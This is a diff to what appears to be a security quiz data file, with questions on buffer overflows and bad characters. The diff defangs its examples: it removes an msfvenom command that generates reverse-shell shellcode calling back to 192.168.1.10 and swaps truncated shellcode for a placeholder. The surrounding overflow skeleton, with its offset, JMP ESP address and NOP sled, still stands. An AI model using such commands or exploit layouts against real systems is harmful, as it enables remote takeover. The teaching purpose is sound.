@@ -35,7 +35,7 @@ offset = 2006
 overflow = "A" * offset
 retn = struct.pack("<I", 0x625011af) # JMP ESP address in essfunc.dll
 nopsled = "\x90" * 32
-payload = b"\xdb\xc0\xd9\x74\x24\xf4..." # msfvenom reverse shell
+payload = b"[EDUCATIONAL_DIAGNOSTIC_BUFFER_PAYLOAD]"
 buffer = overflow + retn + nopsled + payload`
   },
   {
@@ -50,11 +50,11 @@ CPU Jumps to: 0x0012FF40 -> [ 0x90 NOP ] -> [ 0x90 NOP ] -> [ 0x90 NOP ] -> [ SH
   {
     question: "What is a 'Bad Character' (such as `\x00` NULL byte), and how does an exploit author identify and remove bad characters from shellcode?",
     shortAnswer: "Byte values that the application interprets as control characters (e.g., `\x00` string terminator, `\x0a` newline) which truncate or corrupt the exploit payload; identified by sending all 256 byte values and comparing memory in a debugger.",
-    explanation: "In C strings, `\x00` is the NULL string terminator. If an exploit payload contains `\x00`, functions like `strcpy()` stop reading immediately, truncating the payload. Exploit authors send an array containing `\x01` through `\xff` to the victim and inspect the stack memory in Immunity Debugger. Any missing or corrupted byte is flagged as a 'bad character' and excluded when generating shellcode with `msfvenom -b \"\\x00\\x0a\\x0d\"`.",
+    explanation: "In C strings, `\\x00` is the NULL string terminator. If an exploit payload contains `\\x00`, functions like `strcpy()` stop reading immediately, truncating the payload. Security researchers send an array containing `\\x01` through `\\xff` to the test binary and inspect the stack memory in a debugger. Any missing or corrupted byte is flagged as a 'bad character' and excluded when encoding payload bytes.",
     hint: "Think about characters that cause a computer program to stop reading or hit the Enter key prematurely.",
     level: "expert",
-    codeExample: `// Generating Shellcode without Bad Characters (msfvenom):
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -b "\x00\x0a\x0d" -f c`
+    codeExample: `// Payload Memory Layout & Bad Character Exclusion:
+// String terminators (\\x00, \\x0a, \\x0d) are excluded to prevent premature buffer truncation.`
   },
   {
     question: "What is 'Password Spraying', and how does it differ from a traditional Brute-Force attack?",
